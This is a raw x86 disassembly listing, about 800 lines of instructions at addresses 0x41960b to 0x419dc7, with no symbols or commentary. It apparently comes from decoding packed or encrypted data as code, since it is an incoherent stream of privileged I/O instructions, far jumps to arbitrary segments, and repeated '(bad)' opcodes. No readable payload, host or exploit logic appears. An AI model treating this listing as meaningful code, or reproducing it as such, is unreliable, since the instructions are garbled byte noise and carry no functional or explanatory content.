  41960b:	retf   0xb312
  41960e:	jge    0x419685
  419610:	leave  
  419611:	lods   al,BYTE PTR ds:[esi]
  419612:	inc    edi
  419613:	mov    BYTE PTR [edx-0x1a05dff0],0xb9
  41961a:	mov    ds:0xd4883d9,eax
  41961f:	add    edi,esp
  419621:	adc    BYTE PTR [eax],al
  419623:	sbb    ebx,esi
  419625:	outs   dx,DWORD PTR ds:[esi]
  419626:	jle    0x41960b
  419628:	inc    eax
  419629:	loop   0x41964d
  41962b:	push   eax
  41962c:	inc    ebx
  41962d:	dec    esi
  41962e:	stos   DWORD PTR es:[edi],eax
  41962f:	stos   BYTE PTR es:[edi],al
  419630:	add    edi,DWORD PTR [eax-0x4f712259]
  419636:	shl    dh,1
  419638:	cmc    
  419639:	dec    esi
  41963a:	push   0x30
  41963c:	jp     0x419609
  41963e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41963f:	ja     0x419634
  419641:	fldenv ds:0x8a6a31d4
  419647:	ffreep st(1)
  419649:	sub    eax,0xb4899ff0
  41964e:	or     al,BYTE PTR [ebp-0x4]
  419651:	cs mov bh,0x61
  419654:	lahf   
  419655:	ffreep st(7)
  419657:	aam    0xc1
  419659:	jo     0x419683
  41965b:	mov    bl,0x2a
  41965d:	icebp  
  41965e:	ins    DWORD PTR es:[edi],dx
  41965f:	into   
  419660:	add    eax,0x91211e9e
  419665:	xchg   ecx,eax
  419666:	rcl    DWORD PTR [ebp+0x37],1
  419669:	fwait
  41966a:	mov    eax,0x40748b63
  41966f:	or     BYTE PTR [edx],bl
  419671:	pusha  
  419672:	jmp    0x2905:0xff732507
  419679:	mov    ecx,DWORD PTR [ebx+0x31250371]
  41967f:	(bad)  
  419680:	pusha  
  419681:	mov    ch,0xf0
  419683:	mov    bl,0x62
  419685:	call   0xfc7c:0xf82cd2e4
  41968c:	inc    esi
  41968d:	inc    esp
  41968e:	xchg   ecx,eax
  41968f:	add    cl,BYTE PTR [ebp+0x5c6d640f]
  419695:	icebp  
  419696:	ja     0x41961c
  419698:	int3   
  419699:	sub    dh,BYTE PTR [edx+0x65]
  41969c:	ins    DWORD PTR es:[edi],dx
  41969d:	jl     0x4196ae
  41969f:	lods   eax,DWORD PTR ds:[esi]
  4196a0:	or     ah,al
  4196a2:	je     0x41971d
  4196a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a5:	hlt    
  4196a6:	xlat   BYTE PTR ds:[ebx]
  4196a7:	add    bh,cl
  4196a9:	jge    0x419689
  4196ab:	adc    al,0x8b
  4196ad:	xchg   edx,eax
  4196ae:	bound  ebx,QWORD PTR [ebx+0xa77badf]
  4196b4:	loop   0x4196f7
  4196b6:	and    DWORD PTR ds:0x1b139162,edi
  4196bc:	pop    esi
  4196bd:	mov    esi,0x3f6ef203
  4196c2:	jns    0x419740
  4196c4:	sub    al,0xcc
  4196c6:	es nop
  4196c8:	fsubr  QWORD PTR [ebx+0x33]
  4196cb:	jns    0x41969d
  4196cd:	mov    WORD PTR [eax+0x736c4edd],es
  4196d3:	aaa    
  4196d4:	aaa    
  4196d5:	pop    es
  4196d6:	and    ebx,ecx
  4196d8:	mov    eax,ds:0x82c59c0a
  4196dd:	xor    DWORD PTR ds:0x1e73e375,0xffffffd6
  4196e4:	enter  0xea86,0xa7
  4196e8:	adc    bl,BYTE PTR [eax+0x478f465d]
  4196ee:	ret    0xc0a1
  4196f1:	dec    esp
  4196f2:	in     eax,dx
  4196f3:	scas   eax,DWORD PTR es:[edi]
  4196f4:	push   ds
  4196f5:	pop    edx
  4196f6:	stos   BYTE PTR es:[edi],al
  4196f7:	and    DWORD PTR [ebx+0x78cb835d],esp
  4196fd:	cmp    eax,0xcefa6ffa
  419702:	mov    eax,ds:0xe4fd449e
  419707:	stc    
  419708:	int    0x16
  41970a:	aad    0x95
  41970c:	push   ebp
  41970d:	scas   al,BYTE PTR es:[edi]
  41970e:	sbb    ch,ah
  419710:	jno    0x41971f
  419712:	sahf   
  419713:	ja     0x4196dc
  419715:	imul   esp,DWORD PTR [esi+0x2e],0x968aa0e4
  41971c:	dec    ebp
  41971d:	(bad)  
  41971e:	ja     0x4196f4
  419720:	in     al,dx
  419721:	pop    ecx
  419722:	rol    BYTE PTR [ebp+0x1e1c678b],0x95
  419729:	int3   
  41972a:	shr    ah,cl
  41972c:	jp     0x41978e
  41972e:	xor    al,0xef
  419730:	push   ebx
  419731:	loope  0x419795
  419733:	jp     0x419744
  419735:	or     dx,WORD PTR [edx]
  419738:	push   edi
  419739:	lahf   
  41973a:	shl    DWORD PTR [ecx-0x6],cl
  41973d:	mov    bl,0x84
  41973f:	dec    ebp
  419740:	pushf  
  419741:	test   al,0x88
  419743:	(bad)  
  419745:	lahf   
  419746:	cmc    
  419747:	sub    BYTE PTR [edi],bh
  419749:	push   es
  41974a:	push   ds
  41974b:	loop   0x4196dd
  41974d:	mov    cl,0x19
  41974f:	jge    0x419752
  419751:	mov    al,0xfe
  419753:	and    eax,0xeddf634
  419758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419759:	cmp    eax,0x4e0ac819
  41975e:	sahf   
  41975f:	sub    DWORD PTR [esi+0x5e],edi
  419762:	arpl   WORD PTR [edi-0x4fe52b05],si
  419768:	inc    esi
  419769:	into   
  41976a:	push   ebx
  41976b:	or     dh,dl
  41976d:	sub    eax,0xde4e3afe
  419772:	arpl   WORD PTR [esi+ebp*8],si
  419775:	iret   
  419776:	pushw  0x5f0e
  41977a:	stos   DWORD PTR es:[edi],eax
  41977b:	lock or al,0x51
  41977e:	cwde   
  41977f:	fld    DWORD PTR [ecx+0x6a71a1a3]
  419785:	mov    bl,bh
  419787:	retf   
  419788:	(bad)  
  419789:	jno    0x4197c3
  41978b:	(bad)  
  41978c:	sbb    eax,0x4667a273
  419791:	in     al,dx
  419792:	xchg   edx,eax
  419793:	xchg   ecx,eax
  419794:	test   DWORD PTR [ebx+ebx*2],0x55a55a72
  41979b:	sub    BYTE PTR [esi*4+0x6e3c4ebd],0x7f
  4197a3:	dec    ebx
  4197a4:	add    ch,BYTE PTR [eax]
  4197a6:	scas   al,BYTE PTR es:[edi]
  4197a7:	jge    0x41972a
  4197a9:	xor    al,BYTE PTR [esi]
  4197ab:	fimul  DWORD PTR [edi+0x415dce11]
  4197b1:	leave  
  4197b2:	or     eax,0xa46779e5
  4197b7:	jns    0x4197b9
  4197b9:	adc    edi,DWORD PTR [edx]
  4197bb:	fistp  WORD PTR [esi]
  4197bd:	push   edi
  4197be:	pop    edi
  4197bf:	cmp    eax,0xab1eeb4e
  4197c4:	addr16 sbb eax,0x33314053
  4197ca:	add    dh,ch
  4197cc:	push   ebp
  4197cd:	pop    ebp
  4197ce:	mov    dl,0x4d
  4197d0:	loop   0x4197e3
  4197d2:	push   0xffffff92
  4197d4:	int3   
  4197d5:	xor    eax,0x905bda88
  4197da:	fldenv [esi+edi*4-0x58]
  4197de:	dec    esi
  4197df:	xor    DWORD PTR [ebp-0x5d6ee755],0x7d7e8a8
  4197e9:	out    0x4,eax
  4197eb:	sub    BYTE PTR [edx-0x23],al
  4197ee:	jl     0x419867
  4197f0:	adc    eax,0x443cafae
  4197f5:	pop    esi
  4197f6:	test   DWORD PTR [edx-0x50b9e547],eax
  4197fc:	cdq    
  4197fd:	stos   BYTE PTR es:[edi],al
  4197fe:	mov    ebx,0x8658b32e
  419803:	outs   dx,BYTE PTR ds:[esi]
  419804:	aas    
  419805:	cld    
  419806:	push   esi
  419807:	adc    al,BYTE PTR [ebp-0x13]
  41980a:	loope  0x41987a
  41980c:	adc    esp,edx
  41980e:	out    dx,eax
  41980f:	aad    0x25
  419811:	data16 in al,dx
  419813:	ficom  DWORD PTR [edx-0x7c17db64]
  419819:	(bad)  
  41981b:	(bad)  
  41981c:	imul   ah
  41981e:	add    al,0xb8
  419820:	pop    ss
  419821:	std    
  419822:	fiadd  WORD PTR [ebx-0x20]
  419825:	pop    ss
  419826:	std    
  419827:	fmul   DWORD PTR [ebp-0x450d043]
  41982d:	or     eax,0xb7d3cd62
  419832:	cld    
  419833:	mov    eax,ds:0xe7b27dab
  419838:	test   DWORD PTR [esi],ebp
  41983a:	scas   eax,DWORD PTR es:[edi]
  41983b:	test   eax,0x47eb0fc5
  419840:	mov    ch,0x4c
  419842:	cmp    eax,0xfc30f789
  419847:	push   ds
  419848:	icebp  
  419849:	sub    al,0x21
  41984b:	jle    0x4198ad
  41984d:	or     ch,0x58
  419850:	add    cl,BYTE PTR [edx-0x6e]
  419853:	or     esp,edx
  419855:	sbb    DWORD PTR [ecx-0x57],0xffffffc1
  419859:	sbb    bh,0x8e
  41985c:	push   edi
  41985d:	ins    DWORD PTR es:[edi],dx
  41985e:	push   cs
  41985f:	jne    0x4197e7
  419861:	sub    ebx,esi
  419863:	sub    al,0x1a
  419865:	xor    BYTE PTR [eax],dl
  419867:	test   bh,ah
  419869:	aas    
  41986a:	std    
  41986b:	lds    eax,FWORD PTR [ebp+0x1511b7aa]
  419871:	dec    edx
  419872:	or     dl,dl
  419874:	mov    eax,ds:0x5a8e34c0
  419879:	iret   
  41987a:	shr    esp,cl
  41987c:	daa    
  41987d:	mov    ah,0xf3
  41987f:	jmp    DWORD PTR [edi]
  419881:	fist   WORD PTR [esi-0x618afbcc]
  419887:	xchg   ebx,eax
  419888:	outs   dx,DWORD PTR ds:[esi]
  419889:	in     eax,dx
  41988a:	sbb    al,BYTE PTR fs:[ebx-0x59d4c9b3]
  419891:	and    eax,0xaae26ebe
  419896:	add    al,0xe9
  419898:	mov    cl,0x3e
  41989a:	lods   al,BYTE PTR ds:[esi]
  41989b:	xor    DWORD PTR [eax-0x7ed165ac],eax
  4198a1:	fsubr  st(1),st
  4198a3:	jecxz  0x4198c1
  4198a5:	or     BYTE PTR [ebp+esi*1-0x1fc55c49],dl
  4198ac:	mov    ecx,0xb5c1a988
  4198b1:	je     0x419834
  4198b3:	push   ss
  4198b4:	sub    eax,0x5a86cdbf
  4198b9:	jae    0x419919
  4198bb:	pop    ebp
  4198bc:	cs push es
  4198be:	adc    al,BYTE PTR [ecx-0x7a966a40]
  4198c4:	push   eax
  4198c5:	ror    BYTE PTR [edi],0x5c
  4198c8:	or     DWORD PTR [edx+0xd],ecx
  4198cb:	cs out 0x92,al
  4198ce:	fst    DWORD PTR [edx-0x523f6ab8]
  4198d4:	popf   
  4198d5:	xchg   esp,eax
  4198d6:	cmp    edx,eax
  4198d8:	(bad)
  4198dc:	push   es
  4198dd:	cmp    al,0xfc
  4198df:	dec    esi
  4198e0:	adc    eax,0x7bc613e2
  4198e5:	xchg   BYTE PTR [edx-0x2f],ah
  4198e8:	sbb    eax,0x69e3fd29
  4198ed:	or     al,0x4f
  4198ef:	adc    cl,BYTE PTR [ebx-0x142dc88a]
  4198f5:	mov    edi,DWORD PTR [ebp-0x77]
  4198f8:	jmp    0xaf50:0x63c5db62
  4198ff:	push   ebx
  419900:	xchg   BYTE PTR [edx-0x11],dl
  419903:	push   eax
  419904:	test   DWORD PTR [edx],ecx
  419906:	adc    ebp,DWORD PTR [ebx+0x16]
  419909:	ds cld 
  41990b:	mov    bl,0x9b
  41990d:	pop    ds
  41990e:	js     0x41998e
  419910:	std    
  419911:	push   edx
  419912:	in     al,0x63
  419914:	in     eax,dx
  419915:	mov    eax,ds:0xff188542
  41991a:	mov    ah,0x4f
  41991c:	push   cs
  41991d:	jmp    0x4198e1
  41991f:	inc    ebx
  419920:	or     esi,ebx
  419922:	cmp    ah,cl
  419924:	jmp    0x323f:0xd37e9ae2
  41992b:	push   eax
  41992c:	mov    edi,0xb89b9fab
  419931:	sbb    BYTE PTR [esp+ebp*4],al
  419934:	jo     0x419958
  419936:	aas    
  419937:	sahf   
  419938:	shl    BYTE PTR [edi+0x60ff738b],1
  41993e:	jmp    0x4198ce
  419940:	push   0xffffffb2
  419942:	sbb    dl,BYTE PTR [ecx]
  419944:	frstor [ebp-0x93cab1b]
  41994a:	add    eax,0xf1c20207
  41994f:	mov    eax,0xb79ad034
  419954:	xor    eax,0x4dbdb8b4
  419959:	ror    BYTE PTR [edx],1
  41995b:	jns    0x419919
  41995d:	dec    edx
  41995e:	mov    dh,0x76
  419960:	lock pop esi
  419962:	dec    ebx
  419963:	mov    edx,DWORD PTR [edx-0x6b]
  419966:	xrelease mov BYTE PTR gs:[ebx],bl
  41996a:	xchg   DWORD PTR ds:[edx],ecx
  41996d:	jo     0x41990d
  41996f:	dec    esi
  419970:	fimul  WORD PTR [ebp+0x52]
  419973:	mov    dl,0xda
  419975:	xchg   ebx,eax
  419976:	add    dh,ah
  419978:	aam    0x6b
  41997a:	sbb    al,ah
  41997c:	mov    bl,0xb3
  41997e:	adc    al,0x33
  419980:	sub    bh,bl
  419982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419983:	dec    ebx
  419984:	add    DWORD PTR [ebx+ebp*8],edx
  419987:	jl     0x419930
  419989:	retf   
  41998a:	pop    esi
  41998b:	into   
  41998c:	out    0xd7,al
  41998e:	rcr    dh,cl
  419990:	mov    eax,0xc261b974
  419995:	popf   
  419996:	iret   
  419997:	push   es
  419998:	imul   esi,DWORD PTR [ecx],0x133d9106
  41999e:	out    dx,al
  41999f:	cmp    al,0x14
  4199a1:	ins    DWORD PTR es:[edi],dx
  4199a2:	sub    edx,DWORD PTR [edx+0xf]
  4199a5:	xor    eax,0x2749d0b8
  4199aa:	adc    BYTE PTR [eax],0xa4
  4199ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ae:	jle    0x4199cf
  4199b0:	push   esi
  4199b1:	mov    ebp,0xbf5cd096
  4199b6:	(bad)  
  4199b8:	push   0xffffffb5
  4199ba:	call   0xe5f3:0x2d3e8772
  4199c1:	mov    eax,ds:0x7a55d5b2
  4199c6:	xchg   DWORD PTR [esi-0x3dc72c27],ecx
  4199cc:	push   ss
  4199cd:	mov    eax,0xa7a1c19f
  4199d2:	fstp   st(4)
  4199d4:	adc    BYTE PTR [eax-0x2bc9eb47],0x2
  4199db:	jae    0x419a1a
  4199dd:	jmp    0x419992
  4199df:	shl    DWORD PTR [edi+0x403b11de],1
  4199e5:	fisubr WORD PTR ds:0xe81aa7e5
  4199eb:	mov    bh,0x92
  4199ed:	inc    BYTE PTR [edi]
  4199ef:	popf   
  4199f0:	jge    0x4199df
  4199f2:	pop    ebp
  4199f3:	xchg   ecx,eax
  4199f4:	lods   eax,DWORD PTR ds:[esi]
  4199f5:	sahf   
  4199f6:	cld    
  4199f7:	pop    ss
  4199f8:	pop    esi
  4199f9:	sbb    BYTE PTR [esi+0x313fe5e6],0x2f
  419a00:	lds    esi,FWORD PTR [ecx+eiz*8+0xe]
  419a04:	das    
  419a05:	inc    ebp
  419a06:	sbb    ch,BYTE PTR [ebx+ecx*8-0x12]
  419a0a:	inc    ecx
  419a0b:	inc    ecx
  419a0c:	and    BYTE PTR [ebx+edx*2-0x6],bh
  419a10:	xchg   edx,eax
  419a11:	(bad)  
  419a12:	repnz shr bl,cl
  419a15:	dec    ebx
  419a16:	outs   dx,BYTE PTR ds:[esi]
  419a17:	jne    0x4199a2
  419a19:	sbb    eax,0x25d929d8
  419a1e:	xor    al,0x19
  419a20:	scas   eax,DWORD PTR es:[edi]
  419a21:	les    edi,FWORD PTR [ebx+0x4c]
  419a24:	cs das 
  419a26:	retf   0xe832
  419a29:	mov    edx,0xed84792a
  419a2e:	(bad)  
  419a2f:	lea    edi,[ebx]
  419a31:	cmp    eax,0x8268db70
  419a36:	outs   dx,DWORD PTR ds:[esi]
  419a37:	jl     0x419a4b
  419a39:	cmp    eax,0xbb94bb5c
  419a3e:	mov    al,0xc0
  419a40:	fild   DWORD PTR [edi]
  419a42:	fimul  DWORD PTR [edx+ecx*2-0x4d]
  419a46:	pop    ds
  419a47:	add    eax,0x44091d98
  419a4c:	sub    BYTE PTR ds:0x1e9e51f0,ch
  419a52:	jl     0x419a47
  419a54:	or     eax,DWORD PTR [ecx+0x79fc24a4]
  419a5a:	mov    ah,0x3
  419a5c:	adc    eax,0x2496988e
  419a61:	dec    ecx
  419a62:	dec    BYTE PTR [ebx+eax*1-0x2c61fbcf]
  419a69:	aaa    
  419a6a:	int    0x15
  419a6c:	or     bh,BYTE PTR [eax-0x68]
  419a6f:	adc    ecx,ebp
  419a71:	(bad)  
  419a72:	sar    esi,1
  419a74:	pop    ds
  419a75:	mov    ebp,DWORD PTR [esi-0x7d]
  419a78:	pop    ebx
  419a79:	sub    al,bl
  419a7b:	mov    ah,0x73
  419a7d:	sbb    bl,BYTE PTR [eax-0x53d2acdd]
  419a83:	push   0x5d5c2314
  419a88:	cmp    al,0x3e
  419a8a:	sub    ah,BYTE PTR [eax+0x6c]
  419a8d:	sbb    al,0xf4
  419a8f:	ror    BYTE PTR [ebx+0x12cd3746],0x27
  419a96:	jp     0x419adb
  419a98:	push   ss
  419a99:	mov    ch,0x89
  419a9b:	dec    ebx
  419a9c:	mov    ebx,0xe8015ca0
  419aa1:	and    DWORD PTR [edi],0x4a
  419aa4:	je     0x419a6e
  419aa6:	mov    bl,0xeb
  419aa8:	addr16 xchg esp,eax
  419aaa:	xlat   BYTE PTR ds:[ebx]
  419aab:	mov    ds:0xdb11d5cd,eax
  419ab0:	xchg   edi,eax
  419ab1:	sub    al,0xad
  419ab3:	sub    eax,esp
  419ab5:	ret    0x566d
  419ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ab9:	dec    ecx
  419aba:	push   ecx
  419abb:	out    dx,al
  419abc:	cmp    eax,0xa8130548
  419ac1:	xor    ah,BYTE PTR [ecx]
  419ac3:	lea    esp,[eax+0x10]
  419ac6:	(bad)  [esi]
  419ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ac9:	bound  eax,QWORD PTR [eax]
  419acb:	retf   0x3d0
  419ace:	mov    eax,ds:0x9dad9365
  419ad3:	fcom   DWORD PTR [edi]
  419ad5:	inc    esi
  419ad6:	inc    edx
  419ad7:	mov    ds:0x720f908,eax
  419adc:	sti    
  419add:	add    eax,0xdca85f67
  419ae2:	mov    WORD PTR [edi-0x68],cs
  419ae5:	daa    
  419ae6:	fnstsw WORD PTR [edi+0x7fb54db3]
  419aec:	inc    edi
  419aed:	repz (bad) 
  419aef:	fild   QWORD PTR [eax+0x1d94a34b]
  419af5:	jno    0x419afd
  419af7:	sbb    bl,BYTE PTR [edx-0x5607c421]
  419afd:	mov    ah,0x19
  419aff:	lods   al,BYTE PTR ds:[esi]
  419b00:	push   cs
  419b01:	lahf   
  419b02:	push   ss
  419b03:	in     eax,dx
  419b04:	or     al,0xf5
  419b06:	jmp    0x3914:0x169ee4b3
  419b0d:	pop    esp
  419b0e:	imul   sp,WORD PTR ds:0x5ef4dc63,0xfffd
  419b16:	lock scas eax,DWORD PTR es:[edi]
  419b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b19:	pop    es
  419b1a:	test   eax,0x3afce36f
  419b1f:	js     0x419b26
  419b21:	pop    ebp
  419b22:	rcr    BYTE PTR [ecx],0xd3
  419b25:	push   esi
  419b26:	fisub  WORD PTR [esi-0x54f71adb]
  419b2c:	cmp    eax,0xffab63b2
  419b31:	push   ds
  419b32:	enter  0xd69,0x52
  419b36:	sti    
  419b37:	icebp  
  419b38:	mov    esi,0x55313996
  419b3d:	ins    BYTE PTR es:[edi],dx
  419b3e:	mov    dh,0xc2
  419b40:	xchg   ebp,eax
  419b41:	lods   al,BYTE PTR ds:[esi]
  419b42:	loopne 0x419b51
  419b44:	mov    WORD PTR es:[ebx],?
  419b47:	and    al,bl
  419b49:	outs   dx,BYTE PTR ds:[esi]
  419b4a:	out    dx,eax
  419b4b:	nop
  419b4c:	pop    es
  419b4d:	(bad)  
  419b4f:	push   es
  419b50:	cmp    eax,0xe5efb3b3
  419b55:	jp     0x419bd4
  419b57:	aad    0xc8
  419b59:	fsubrp st(4),st
  419b5b:	loopne 0x419b5c
  419b5d:	ja     0x419b88
  419b5f:	ja     0x419b5d
  419b61:	dec    edx
  419b62:	mov    edi,0x69738f81
  419b67:	xchg   ecx,eax
  419b68:	stos   DWORD PTR es:[edi],eax
  419b69:	out    0x54,eax
  419b6b:	jno    0x419bc2
  419b6d:	mov    ds:0xec10a22b,eax
  419b72:	or     eax,0x2225ec62
  419b77:	mov    BYTE PTR [eax+0x6f3bcc8c],bl
  419b7d:	jmp    0xf396f405
  419b82:	pusha  
  419b83:	jg     0x419be6
  419b85:	cld    
  419b86:	mov    ecx,0xf10653
  419b8b:	pop    ds
  419b8c:	popa   
  419b8d:	add    DWORD PTR [ebp-0x61],edx
  419b90:	add    DWORD PTR [edx],eax
  419b92:	mov    dh,0x1c
  419b94:	mov    ch,0x14
  419b96:	ffreep st(0)
  419b98:	push   0xffffffa5
  419b9a:	ss out dx,al
  419b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b9d:	sub    al,0x3f
  419b9f:	sub    eax,0x614c096a
  419ba4:	adc    esi,DWORD PTR [eax]
  419ba6:	lds    ebx,FWORD PTR ds:0x2bf35285
  419bac:	nop
  419bad:	adc    DWORD PTR [ecx+ebp*2],ecx
  419bb0:	pop    edi
  419bb1:	inc    esp
  419bb2:	sti    
  419bb3:	inc    edx
  419bb4:	sbb    BYTE PTR [ecx+edi*1-0x52e74a56],dh
  419bbb:	pushf  
  419bbc:	fild   QWORD PTR [ebp+0x1a]
  419bbf:	in     al,0x54
  419bc1:	xchg   ecx,eax
  419bc2:	mov    cl,0x9c
  419bc4:	iret   
  419bc5:	mov    edx,0xd6d430a9
  419bca:	enter  0xa798,0xc7
  419bce:	add    BYTE PTR [ecx],cl
  419bd0:	test   eax,0x231fc0f1
  419bd5:	sti    
  419bd6:	jle    0x419c32
  419bd8:	int3   
  419bd9:	mov    ss,WORD PTR [edi+0x1a]
  419bdc:	or     al,0xd9
  419bde:	add    dh,BYTE PTR [bp+di-0x18ff]
  419be3:	ror    DWORD PTR [esi+0x22],1
  419be6:	addr16 out dx,eax
  419be8:	sub    bl,BYTE PTR [esi+0x5b]
  419beb:	sub    eax,0xce0a984c
  419bf0:	in     al,0x56
  419bf2:	popa   
  419bf3:	loope  0x419b84
  419bf5:	ss sub al,0x1c
  419bf8:	pop    ds
  419bf9:	ficomp DWORD PTR [esp+eiz*4+0x6]
  419bfd:	mov    WORD PTR [ebp+0x255c077d],?
  419c03:	into   
  419c04:	adc    ecx,DWORD PTR [edi]
  419c06:	lods   eax,DWORD PTR ds:[esi]
  419c07:	ret    0x9c47
  419c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c0b:	rcl    ebp,1
  419c0d:	or     DWORD PTR [esi+edx*1+0x79cf367f],0x78
  419c15:	mov    edx,0x96db045
  419c1a:	sbb    bh,BYTE PTR [ecx+0x6173b858]
  419c20:	out    dx,eax
  419c21:	rcl    BYTE PTR [edi+0x60],0x64
  419c25:	mov    dl,BYTE PTR [ebx+0x697b2a37]
  419c2b:	and    al,BYTE PTR [edx-0x17]
  419c2e:	outs   dx,DWORD PTR ds:[esi]
  419c2f:	add    eax,0xa11e592d
  419c34:	call   0x43f8:0xbb19e3dc
  419c3b:	gs (bad) 
  419c3d:	mov    WORD PTR [edx],fs
  419c3f:	ret    
  419c40:	popf   
  419c41:	inc    eax
  419c42:	(bad)  
  419c43:	pop    ss
  419c44:	arpl   sp,si
  419c46:	ret    0x12e8
  419c49:	in     eax,0x2
  419c4b:	pop    ss
  419c4c:	bound  edi,QWORD PTR [edx+0x29]
  419c4f:	sub    DWORD PTR [ecx+0x5a],eax
  419c52:	pop    es
  419c53:	imul   edi,DWORD PTR [eax-0x3c6a79d3],0x39
  419c5a:	mov    dl,0x2d
  419c5c:	dec    edx
  419c5d:	lods   al,BYTE PTR ds:[esi]
  419c5e:	call   0x74c6:0xf06d933b
  419c65:	mov    bh,0xb3
  419c67:	inc    esi
  419c68:	mov    cl,0x42
  419c6a:	inc    edi
  419c6b:	fld    QWORD PTR [esi-0x78]
  419c6e:	out    0xf2,eax
  419c70:	xchg   edx,eax
  419c71:	fcomp  QWORD PTR [edi+esi*4+0x40]
  419c75:	retf   
  419c76:	cmp    BYTE PTR [ecx],cl
  419c78:	(bad)  
  419c79:	push   cs
  419c7a:	push   edx
  419c7b:	test   BYTE PTR [ebp-0x10],ah
  419c7e:	cmp    al,BYTE PTR [esi]
  419c80:	jb     0x419cb4
  419c82:	pop    ebp
  419c83:	xor    eax,0x7eef8b1f
  419c88:	sahf   
  419c89:	sub    bh,cl
  419c8b:	pop    eax
  419c8c:	das    
  419c8d:	cmc    
  419c8e:	pushf  
  419c8f:	jl     0x419cee
  419c91:	mov    edx,ecx
  419c93:	add    esp,esp
  419c95:	(bad)  
  419c96:	cdq    
  419c97:	fisttp DWORD PTR [ebp-0x492eb7ff]
  419c9d:	sahf   
  419c9e:	aas    
  419c9f:	mov    bh,0x15
  419ca1:	dec    ecx
  419ca2:	retf   0x8bf9
  419ca5:	(bad)  
  419ca6:	dec    esp
  419ca7:	jns    0x419d0c
  419ca9:	cli    
  419caa:	cmp    DWORD PTR [edi],edi
  419cac:	mov    ah,0xa7
  419cae:	cs in  eax,0xd3
  419cb1:	pop    esi
  419cb2:	push   0xa2b35249
  419cb7:	sbb    dh,BYTE PTR [ebx]
  419cb9:	outs   dx,DWORD PTR ds:[esi]
  419cba:	cwde   
  419cbb:	mov    ah,0x85
  419cbd:	jae    0x419ca2
  419cbf:	adc    al,0x20
  419cc1:	(bad)  
  419cc2:	call   DWORD PTR [ebx+edi*2+0x2e33aa68]
  419cc9:	test   BYTE PTR [edi-0x66f1beed],bl
  419ccf:	sbb    DWORD PTR [eax+0x406779d9],esi
  419cd5:	test   al,0xd1
  419cd7:	push   ebx
  419cd8:	jae    0x419d0e
  419cda:	pop    eax
  419cdb:	inc    esi
  419cdc:	stos   BYTE PTR es:[edi],al
  419cdd:	xchg   ecx,eax
  419cde:	(bad)  
  419cdf:	call   0x60a3:0x741dc059
  419ce6:	lock push DWORD PTR [ebp+0x73]
  419cea:	cli    
  419ceb:	out    0xff,al
  419ced:	mov    ds:0x76f168c8,eax
  419cf2:	adc    edx,DWORD PTR [ecx+eax*4-0x48]
  419cf6:	pop    esi
  419cf7:	in     eax,0x4c
  419cf9:	push   esp
  419cfa:	out    0x2e,al
  419cfc:	sub    ah,BYTE PTR [esi]
  419cfe:	and    DWORD PTR [esi-0x1d38f15d],ebp
  419d04:	mov    edx,0x6fc95eb9
  419d09:	jo     0x419ccb
  419d0b:	jnp    0x419d0a
  419d0d:	mov    esi,0xa772ac8d
  419d12:	and    eax,0xbaa0e44f
  419d17:	mov    ch,0x81
  419d19:	jl     0x419cd5
  419d1b:	out    0x89,eax
  419d1d:	mov    bh,0x98
  419d1f:	idiv   DWORD PTR [esi]
  419d21:	dec    ebx
  419d22:	sahf   
  419d23:	push   es
  419d24:	and    edx,DWORD PTR [ecx]
  419d26:	add    DWORD PTR [esi],0x1c2fb5dc
  419d2c:	or     al,bh
  419d2e:	mov    edx,0x5efad367
  419d33:	addr16 pop esi
  419d35:	xor    BYTE PTR [esi+0x2d0b9aba],dl
  419d3b:	iret   
  419d3c:	jle    0x419cca
  419d3e:	cmp    DWORD PTR [edi],esi
  419d40:	pop    ebx
  419d41:	inc    ebp
  419d42:	push   esp
  419d43:	cli    
  419d44:	rcr    BYTE PTR [ebp+0x11],1
  419d47:	ins    BYTE PTR es:[edi],dx
  419d48:	push   edi
  419d49:	adc    DWORD PTR [edi-0x42],ecx
  419d4c:	fldenv [edi]
  419d4e:	mov    al,0x59
  419d50:	inc    ebx
  419d51:	sbb    bl,BYTE PTR [ebx]
  419d53:	loop   0x419dbd
  419d55:	loop   0x419d91
  419d57:	into   
  419d58:	sub    al,0xa1
  419d5a:	fwait
  419d5b:	aam    0xe2
  419d5d:	lock scas al,BYTE PTR es:[edi]
  419d5f:	or     eax,0x52da1b28
  419d64:	xchg   BYTE PTR [edx+0x7a],ch
  419d67:	cmp    al,0xe2
  419d69:	(bad)  
  419d6a:	into   
  419d6b:	mov    esp,0x7e2459ff
  419d70:	repnz dec ebp
  419d72:	push   0xa49b67c9
  419d77:	mov    eax,ds:0x4cd0d9f9
  419d7c:	enter  0xa7b2,0xcc
  419d80:	bound  edi,QWORD PTR [ebx]
  419d82:	popa   
  419d83:	push   esp
  419d84:	mov    ecx,0xd35f20fe
  419d89:	xchg   esi,eax
  419d8a:	rcl    DWORD PTR [edx-0x7352ad2c],1
  419d90:	std    
  419d91:	sub    DWORD PTR [eax+esi*4-0x5a759c87],eax
  419d98:	jp     0x419dc8
  419d9a:	loopne 0x419d30
  419d9c:	push   edi
  419d9d:	xor    BYTE PTR [esi+0x7],ah
  419da0:	clc    
  419da1:	bound  edi,QWORD PTR [ebp-0x35]
  419da4:	dec    edx
  419da5:	dec    ecx
  419da6:	push   es
  419da7:	inc    esi
  419da8:	pop    ss
  419da9:	and    bl,BYTE PTR [esp+ecx*8]
  419dac:	das    
  419dad:	ins    DWORD PTR es:[edi],dx
  419dae:	stos   BYTE PTR es:[edi],al
  419daf:	repz push eax
  419db1:	inc    ebp
  419db2:	cmp    ecx,DWORD PTR [esi-0x3d]
  419db5:	je     0x419d7f
  419db7:	iret   
  419db8:	pop    ebp
  419db9:	fnstcw WORD PTR [esi-0x9]
  419dbc:	jle    0x419de2
  419dbe:	sub    ecx,DWORD PTR [edx]
  419dc0:	scas   eax,DWORD PTR es:[edi]
  419dc1:	sub    al,0xbd
  419dc3:	jae    0x419e0d
  419dc5:	xchg   esp,eax
  419dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dc7:	dec    eax
